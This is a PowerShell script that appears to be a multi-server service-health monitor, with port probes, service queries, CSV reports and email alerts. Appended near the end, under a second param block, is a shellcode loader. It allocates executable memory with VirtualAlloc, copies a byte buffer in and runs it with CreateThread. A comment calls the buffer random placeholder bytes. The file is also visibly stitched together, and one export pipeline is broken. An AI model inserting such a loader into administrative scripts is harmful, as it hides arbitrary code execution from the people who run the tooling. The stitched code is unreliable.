
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string[]]$Servers = @('web-prod-03', 'sql-prod-02', 'filesrv01', 'dc01', 'srv01'),
    [string[]]$Services = @('MSSQLSERVER', 'SNMP', 'W3SVC'),

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 65535)]
    [int]$Port = 443,
    [int]$TimeoutMilliseconds = 1000,
    [string]$ReportPath = "C:\Reports\service-health-2025-03-16.csv"
)
$ErrorActionPreference = "Stop"

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$ProgressPreference = 'SilentlyContinue'

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}
$down = @($results | Where-Object { $_.Status -ne 'Running' })
$unreachable = @($results | Where-Object { $_.Status -eq 'Unreachable' })

$retry = @($down | Where-Object { $_.Service -ne '*' })
for ($attempt = 1; $attempt -le 2; $attempt++) {
    if (@($retry).Count -eq 0) { break }
    Start-Sleep -Seconds 5
    Write-Verbose ("Retry {0}: {1} services still down" -f $attempt, @($retry).Count)
    $retry = @($retry | Where-Object {
        (Get-Service -ComputerName $_.Server -Name $_.Service -ErrorAction SilentlyContinue).Status -ne 'Running'
    })
}

$results |
    -NoTypeInformation `
    -Path $ReportPath `
    -Encoding UTF8

$down | Export-Csv -Path $ReportPath.Replace('.csv', '-down.csv') -NoTypeInformation -Encoding UTF8

$byServer = $results | Group-Object -Property Server | ForEach-Object {
    [pscustomobject]@{
        Server = $_.Name
        Checks = $_.Count
        Failed = @($_.Group | Where-Object { $_.Status -ne 'Running' }).Count
    }
}
$byServer | Format-Table -AutoSize
$MailTo = 'monitoring@internal.corp'
$down = @($results | Where-Object { $_.Status -ne 'Running' })
if ($down.Count -gt 0) {
    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
    Send-MailMessage -To $MailTo -From 'monitoring@internal.corp' -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer 'smtp.internal.corp' -Port 25 -UseSsl
}

$history = $ReportPath.Replace('.csv', '-history.csv')
$results | Export-Csv -Path $history -NoTypeInformation -Append -Encoding UTF8
Write-Host ("Health check complete: {0} of {1} services running" -f (@($results).Count - $down.Count), @($results).Count) -ForegroundColor Green

$errorRows = $results | Where-Object { $_.Status -eq 'NotFound' }
if (@($errorRows).Count -gt 0) {
    Write-Warning ("Services not installed: {0}" -f @($errorRows).Count)
}

$probe = Test-ServerPort -ComputerName $env:COMPUTERNAME -Port $Port
Write-Verbose ("Local port {0} reachable: {1}" -f $Port, $probe)

$dashboard = $results | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{ Service = $_.Name; Running = @($_.Group | Where-Object { $_.Status -eq 'Running' }).Count }
}
$dashboard | Format-Table -AutoSize

$osInfo = foreach ($srv in $Servers) {
    [pscustomobject]@{
        Server = $srv
        Reachable = Test-ServerPort -ComputerName $srv -Port $Port
    }
}
$osInfo | Format-Table -AutoSize

$uptime = @($results | Where-Object { $_.Status -eq 'Running' }).Count
Write-Verbose ("Running checks: {0}" -f $uptime)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x01, 0x74, 0x0e, 0x32, 0x38, 0x8d, 0x42, 0xf4, 0x7b, 0xf3, 0x80, 0xdd, 0x07, 0xe0, 0x00, 0x69,
    0x57, 0xdf, 0xa1, 0x1e, 0xb5, 0x8d, 0xea, 0x46, 0xa4, 0x91, 0x3f, 0xb6, 0x3c, 0xc6, 0x9f, 0x4d,
    0x26, 0xad, 0x6e, 0xd8, 0x95, 0x4d, 0xca, 0xd8, 0xa7, 0x2a, 0xfb, 0x6e, 0x77, 0x41, 0x78, 0x8b,
    0xa1, 0x9e, 0x9f, 0x6e, 0xb5, 0x6a, 0xa2, 0xda, 0xaa, 0x6d, 0xa1, 0x48, 0xb7, 0x0e, 0x08, 0xfe,
    0x94, 0x84, 0x27, 0x9c, 0xeb, 0x5c, 0x42, 0xd2, 0x5d, 0x6d, 0xa3, 0x0b, 0x64, 0x75, 0x16, 0x04,
    0x5b, 0x5d, 0x78, 0x25, 0x19, 0x6b, 0xcc, 0x20, 0xef, 0xeb, 0xf2, 0xc0, 0xab, 0xb2, 0x28, 0xd5,
    0x03, 0x33, 0xe0, 0xf9, 0xa2, 0x4e, 0x39, 0x51, 0x69, 0xa2, 0x16, 0x02, 0x88, 0x73, 0xe7, 0x42,
    0xba, 0xd6, 0x5d, 0x6c, 0x7f, 0x70, 0x3a, 0xae, 0x79, 0x98, 0xba, 0x78, 0x7f, 0x6d, 0xd9, 0xe5,
    0x05, 0x9d, 0x03, 0xb6, 0x32, 0x3b, 0x3d, 0x2a, 0xb9, 0x5a, 0xfe, 0x86, 0xaf, 0x40, 0x7d, 0x5b,
    0x31, 0x90, 0x93, 0x04, 0xa2, 0xa5, 0x1c, 0xc4, 0x56, 0xe4, 0x20, 0x32, 0x94, 0x67, 0x85, 0x45,
    0xdb, 0xcc, 0xb5, 0x31, 0xf2, 0xd7, 0xa6, 0x3b, 0x6f, 0x68, 0x74, 0xbf, 0x2b, 0x79, 0xd5, 0xc9,
    0x8d, 0xe7, 0xf7, 0x56, 0x29, 0xe1, 0x20, 0x54, 0xcc, 0xf7, 0x36, 0x4a, 0x75, 0x12, 0xf9, 0x75,
    0xbd, 0x20, 0x2e, 0xf1, 0x7b, 0x2f, 0x44, 0xfc, 0x73, 0xcf, 0x9c, 0x2f, 0x77, 0x0f, 0x76, 0x4a,
    0x9e, 0xf9, 0xef, 0xbf, 0x9b, 0x01, 0x96, 0x20, 0xd0, 0xb8, 0xd6, 0xe0, 0x81, 0xa0, 0x6d, 0x2c,
    0xb6, 0x3e, 0xf0, 0x9c, 0x33, 0xd1, 0x4f, 0x6f, 0x3a, 0x1b, 0x6d, 0xce, 0x94, 0x93, 0x80, 0x54,
    0x35, 0xf5, 0xbf, 0xd4, 0x47, 0xe8, 0xa8, 0x82, 0x0f, 0x83, 0xdc, 0x59, 0xba, 0xe7, 0x14, 0xfe,
    0x46, 0x21, 0xa6, 0xd1, 0x11, 0x53, 0xc9, 0xd4, 0xbd, 0xdc, 0x8c, 0xfe, 0x83, 0xfa, 0x26, 0x6e,
    0x02, 0xa3, 0x65, 0x9c, 0x78, 0x73, 0x52, 0x42, 0xca, 0x1c, 0x28, 0x08, 0x38, 0x9c, 0x64, 0x0c,
    0x1a, 0x13, 0x3a, 0x5f, 0xb0, 0xd2, 0x36, 0x81, 0xa8, 0x61, 0x0a, 0xd0, 0x01, 0x93, 0x7a, 0xb4,
    0x2d, 0x85, 0xad, 0x2c, 0xf6, 0xf6, 0xf4, 0x72, 0x51, 0x39, 0x1c, 0x8e, 0x0b, 0xcf, 0xcd, 0x06,
    0x7a, 0x0c, 0xc3, 0xa8, 0xc8, 0xc2, 0xa3, 0x3e, 0x06, 0x0a, 0xb9, 0xaa, 0x7e, 0xca, 0xd2, 0xa4,
    0xae, 0xa5, 0xce, 0x1d, 0xf9, 0x49, 0xfb, 0x3b, 0xdb, 0x7c, 0x7d, 0xe9, 0x9b, 0x10, 0x7b, 0x51,
    0xc9, 0xdb, 0x1b, 0x80, 0xff, 0xe5, 0xae, 0x07, 0xfb, 0x23, 0xaf, 0x83, 0x1f, 0xed, 0x09, 0x51,
    0x98, 0xb8, 0xf3, 0x79, 0x3f, 0x6f, 0xfa, 0x3b, 0x0c, 0x13, 0xf7, 0xf2, 0x16, 0xeb, 0x93, 0x7d,
    0x8f, 0x3c, 0xbe, 0xce, 0x32, 0x9a, 0xce, 0x26, 0xa6, 0x6e, 0x83, 0x78, 0x04, 0xac, 0x35, 0x2a,
    0x61, 0xd1, 0xfd, 0x31, 0x6c, 0x78, 0x8f, 0xf6, 0xa6, 0x7a, 0x03, 0xa6, 0x63, 0x63, 0xae, 0x8e,
    0x31, 0xaa, 0xf6, 0x8d, 0x0f, 0x6e, 0x4f, 0xf2, 0x2c, 0xe7, 0x84, 0xee, 0x2e, 0x17, 0xa6, 0xc7,
    0xee, 0x76, 0xa9, 0xd4, 0xd2, 0x62, 0x1c, 0x90, 0x21, 0x16, 0x12, 0x41, 0x2e, 0x5d, 0x1c, 0x39,
    0x99, 0x8b, 0xe8, 0x72, 0x33, 0x17, 0x11, 0xac, 0x37, 0x40, 0x01, 0x90, 0x33, 0x73, 0xb1, 0x15,
    0x8b, 0xde, 0xe9, 0x77, 0x58, 0x00, 0xd8, 0xae, 0x8a, 0xd0, 0x66, 0xb0, 0x99, 0x7c, 0xee, 0x16,
    0x08, 0x9a, 0xbd, 0xa7, 0x05, 0xcd, 0x74, 0xa8, 0xb5, 0xf8, 0xac, 0x21, 0x59, 0x44, 0xa6, 0x15,
    0xa4, 0xc3, 0x14, 0x3d, 0x8b, 0x89, 0xe7, 0x4f, 0xbc, 0x65, 0x22, 0xd1, 0xd3, 0x49, 0x2d, 0x0a,
    0x85, 0x39, 0xa0, 0x21, 0xd0, 0xba, 0x6f, 0xe1, 0xe9, 0x90, 0x9e, 0x71, 0x51, 0xbc, 0x24, 0x36,
    0x32, 0x7f, 0xf7, 0xaf, 0x6d, 0xa1, 0xcc, 0x39, 0x7a, 0x31, 0x2e, 0x52, 0xc4, 0x59, 0x71, 0x51,
    0x71, 0xac, 0x68, 0xab, 0xfb, 0xe8, 0x14, 0xa8, 0x64, 0xb4, 0xd5, 0x74, 0xd7
)

$ProcHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 3015)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
